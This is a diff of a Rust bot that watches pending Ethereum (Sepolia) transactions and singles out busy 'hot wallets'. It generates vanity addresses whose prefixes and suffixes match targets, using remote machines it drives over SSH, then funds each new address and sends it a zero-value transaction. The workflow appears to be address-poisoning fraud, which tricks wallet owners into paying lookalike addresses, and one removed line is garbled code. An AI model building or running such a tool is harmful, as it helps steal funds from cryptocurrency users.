@@ -1,7 +1,7 @@
 use ethers::{
     middleware::SignerMiddleware,
-    providers::{Http, Middleware, Provider, StreamExt},
-    types::{Address, Transaction, BlockNumber, U256},
+    providers::{Middleware, Provider, StreamExt, Ws},
+    types::{Address, BlockNumber, H160, U256},
     signers::{LocalWallet, Signer},
 };
 use rusqlite::{params, Connection};
@@ -19,13 +19,7 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use std::fs::OpenOptions;
 use std::io::Write;
 use serde::{Deserialize, Serialize};
-use vanity_project::generator::VanityGenerator;
-
-#[derive(Serialize, Deserialize)]
-struct KeyPair {
-    address: [u8; 20],
-    secret: [u8; 32],
-}
+use vanity_project::generator::KeyPair;
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
@@ -84,13 +78,15 @@ async fn main() -> anyhow::Result<()> {
         .collect();
 
     let provider = retry(3, Duration::from_secs(5), || async {
-        Provider::<Http>::try_from(format!(
-            "https://sepolia.infura.io/v3/{}",
+        Ws::connect(format!(
+            "wss://sepolia.infura.io/v3/{}",
             infura_api_key
         ))
+        .await
+        .map_err(|e| anyhow::anyhow!("WebSocket connection failed: {}", e))
     })
     .await?;
-    let provider = Arc::new(provider);
+    let provider = Arc::new(Provider::new(provider));
 
     let wallet: LocalWallet = wallet_private_key.parse()?;
     let client = Arc::new(SignerMiddleware::new(provider.clone(), wallet));
@@ -114,6 +110,8 @@ async fn main() -> anyhow::Result<()> {
         let client_clone = client.clone();
         let log_file_clone = log_file.clone();
         let db_file_clone = db_file.clone();
+        let ssh_configs_clone = ssh_configs.clone();
+        let ssh_user_clone = ssh_user.clone();
         tokio::spawn(async move {
             if let Err(e) = scan_transactions(
                 provider_clone,
@@ -123,6 +121,8 @@ async fn main() -> anyhow::Result<()> {
                 client_clone,
                 &log_file_clone,
                 &db_file_clone,
+                &ssh_configs_clone,
+                &ssh_user_clone,
             )
             .await {
                 let conn = Connection::open(&db_file_clone).unwrap();
@@ -141,17 +141,9 @@ async fn main() -> anyhow::Result<()> {
                 params![addr_hex, priv_key, prefix, suffix, created_at],
             )?;
 
-            log_to_file(
-                &log_file,
-                &format!(
-                    "Found vanity address: 0x{} (Private key: 0x{}) for prefix: {}, suffix: {}",
-                    addr_hex, priv_key, prefix, suffix
-                ),
-            )?;
-
             if let Ok(receipt) = retry(3, Duration::from_secs(5), || async {
                 let tx = ethers::types::TransactionRequest::new()
-                    .to(keypair.address)
+                    .to(H160::from(keypair.address))
                     .value(U256::from(10_000_000_000_000_000u64)) // 0.01 ETH
                     .from(client.address());
                 client.send_transaction(tx, None).await?.await
@@ -166,21 +158,16 @@ async fn main() -> anyhow::Result<()> {
                 log_error(&conn, &log_file, "Failed to send 0.01 ETH")?;
             }
 
-            if let Ok(receipt) = retry(3, Duration::from_secs(5), || async {
+            if let Err(e) = retry(3, Duration::from_secs(5), || async {
                 let tx = ethers::types::TransactionRequest::new()
-                    .to(keypair.address)
+                    .to(H160::from(keypair.address))
                     .value(U256::zero())
                     .from(client.address());
                 client.send_transaction(tx, None).await?.await
             })
             .await
             {
-                log_to_file(
-                    &log_file,
-                    &format!("Sent 0 ETH transaction: {:?}", receipt.transaction_hash),
-                )?;
-            } else {
-                log_error(&conn, &log_file, "Failed to send 0 ETH transaction")?;
+                log_error(&conn, &log_file, &format!("Failed to send 0 ETH transaction: {}", e))?;
             }
         }
     }
@@ -195,7 +182,7 @@ where
     loop {
         match f().await {
             Ok(result) => return Ok(result),
-            Err(e) if attempts < max_attempts - 1 => {
+            Err(_e) if attempts < max_attempts - 1 => {
                 attempts += 1;
                 sleep(delay).await;
             }
@@ -208,6 +195,7 @@ async fn setup_server(host: &str, user: &str, pass: &str, log_file: &str, db_fil
     let conn = Connection::open(db_file)?;
     let tcp = retry(3, Duration::from_secs(5), || async {
         TcpStream::connect(format!("{}:22", host))
+            .map_err(|e| anyhow::anyhow!("TCP connection failed: {}", e))
     })
     .await?;
     let mut sess = Session::new()?;
@@ -231,9 +219,9 @@ async fn setup_server(host: &str, user: &str, pass: &str, log_file: &str, db_fil
     }
 
     let mut channel = sess.channel_session()?;
-    let repo_url = "https://your-repo-url.git"; // Replace with your repo URL
+    let repo_url = "https://github.com/dapslegend/Runity.git";
     channel.exec(&format!(
-        "git clone {} /tmp/vanity-project && cd /tmp/vanity-project && cargo build --release",
+        "git clone {} /tmp/Runity && cd /tmp/Runity && cargo build --release",
         repo_url
     ))?;
     channel.close()?;
@@ -252,7 +240,8 @@ async fn check_ssh_connectivity(
     let conn = Connection::open(db_file)?;
     for (host, pass) in configs {
         let result = retry(3, Duration::from_secs(5), || async {
-            let tcp = TcpStream::connect(format!("{}:22", host))?;
+            let tcp = TcpStream::connect(format!("{}:22", host))
+                .map_err(|e| anyhow::anyhow!("TCP connection failed: {}", e))?;
             let mut sess = Session::new()?;
             sess.set_tcp_stream(tcp);
             sess.handshake()?;
@@ -270,19 +259,23 @@ async fn check_ssh_connectivity(
 }
 
 async fn scan_transactions(
-    provider: Arc<Provider<Http>>,
+    provider: Arc<Provider<Ws>>,
     tx: mpsc::Sender<(KeyPair, String, String)>,
     hot_wallet_threshold: usize,
     hot_wallet_window: u64,
-    client: Arc<SignerMiddleware<Provider Ballance(Http), LocalWallet>>,
+    client: Arc<SignerMiddleware<Provider<Ws>, LocalWallet>>,
     log_file: &str,
     db_file: &str,
+    ssh_configs: &[(String, String)],
+    ssh_user: &str,
 ) -> anyhow::Result<()> {
     let conn = Connection::open(db_file)?;
     let mut stream = provider.subscribe_pending_txs().await?;
     while let Some(tx_hash) = stream.next().await {
         if let Ok(Some(tx)) = retry(3, Duration::from_secs(5), || async {
-            provider.get_transaction(tx_hash).await
+            provider.get_transaction(tx_hash)
+                .await
+                .map_err(|e| anyhow::anyhow!("Get transaction failed: {}", e))
         })
         .await
         {
@@ -329,7 +322,7 @@ async fn scan_transactions(
 
                             let keypair = timeout(
                                 Duration::from_secs(600),
-                                generate_vanity_address(&prefix, &suffix, tx.clone(), &ssh_configs, &ssh_user, &log_file, &db_file),
+                                generate_vanity_address(&prefix, &suffix, tx.clone(), ssh_configs, ssh_user, log_file, db_file),
                             )
                             .await??;
                             tx.send((keypair, prefix, suffix)).await?;
@@ -343,7 +336,7 @@ async fn scan_transactions(
 }
 
 async fn is_hot_wallet(
-    provider: &Provider<Http>,
+    provider: &Provider<Ws>,
     address: Address,
     threshold: usize,
     window_secs: u64,
@@ -356,14 +349,12 @@ async fn is_hot_wallet(
 
     for block_num in start_block..=current_block {
         if let Some(block) = provider.get_block(BlockNumber::Number(block_num.into())).await? {
-            if let Some(txs) = block.transactions {
-                for tx in txs {
-                    if let Some(tx) = provider.get_transaction(tx).await? {
-                        if tx.from == Some(address) {
-                            tx_count += 1;
-                            if tx_count >= threshold {
-                                return Ok(true);
-                            }
+            for tx_hash in block.transactions {
+                if let Some(tx) = provider.get_transaction(tx_hash).await? {
+                    if tx.from == address {
+                        tx_count += 1;
+                        if tx_count >= threshold {
+                            return Ok(true);
                         }
                     }
                 }
@@ -417,7 +408,7 @@ async fn generate_vanity_address(
         });
     }
 
-    let (keypair, _, _) = tx.recv().await.ok_or_else(|| anyhow::anyhow!("No vanity address found"))?;
+    let (keypair, _, _) = rx.recv().await.ok_or_else(|| anyhow::anyhow!("No vanity address found"))?;
     Ok(keypair)
 }
 
@@ -441,6 +432,7 @@ async fn run_ssh_worker(
 ) -> anyhow::Result<()> {
     let tcp = retry(3, Duration::from_secs(5), || async {
         TcpStream::connect(format!("{}:22", host))
+            .map_err(|e| anyhow::anyhow!("TCP connection failed: {}", e))
     })
     .await?;
     let mut sess = Session::new()?;
@@ -450,7 +442,7 @@ async fn run_ssh_worker(
 
     let mut channel = sess.channel_session()?;
     let cmd = format!(
-        "cd /tmp/vanity-project && cargo run --release --bin vanity_gen -- --prefix {} --suffix {}",
+        "cd /tmp/Runity && cargo run --release --bin vanity_gen -- --prefix {} --suffix {}",
         prefix, suffix
     );
     channel.exec(&cmd)?;
@@ -460,11 +452,27 @@ async fn run_ssh_worker(
     channel.close()?;
     channel.wait_close()?;
 
-    if let Ok(keypair) = serde_json::from_str::<KeyPair>(&output) {
+    if let Ok(keypair_output) = serde_json::from_str::<KeyPairOutput>(&output) {
+        let addr_bytes: [u8; 20] = hex::decode(keypair_output.address.strip_prefix("0x").unwrap_or(&keypair_output.address))?
+            .try_into()
+            .map_err(|_| anyhow::anyhow!("Invalid address"))?;
+        let secret_bytes: [u8; 32] = hex::decode(keypair_output.secret.strip_prefix("0x").unwrap_or(&keypair_output.secret))?
+            .try_into()
+            .map_err(|_| anyhow::anyhow!("Invalid private key"))?;
+        let keypair = KeyPair {
+            address: addr_bytes,
+            secret: secret_bytes,
+        };
         tx.send((keypair, prefix.to_string(), suffix.to_string())).await?;
     }
 
     Ok(())
+}
+
+#[derive(Deserialize)]
+struct KeyPairOutput {
+    address: String,
+    secret: String,
 }
 
 fn log_to_file(file: &str, message: &str) -> anyhow::Result<()> {
@@ -472,9 +480,12 @@ fn log_to_file(file: &str, message: &str) -> anyhow::Result<()> {
         .create(true)
         .append(true)
         .open(file)?;
-    writeln!(file, "[{}] {}", 
+    writeln!(
+        file,
+        "[{}] {}",
         SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(),
-        message)?;
+        message
+    )?;
     Ok(())
 }
 
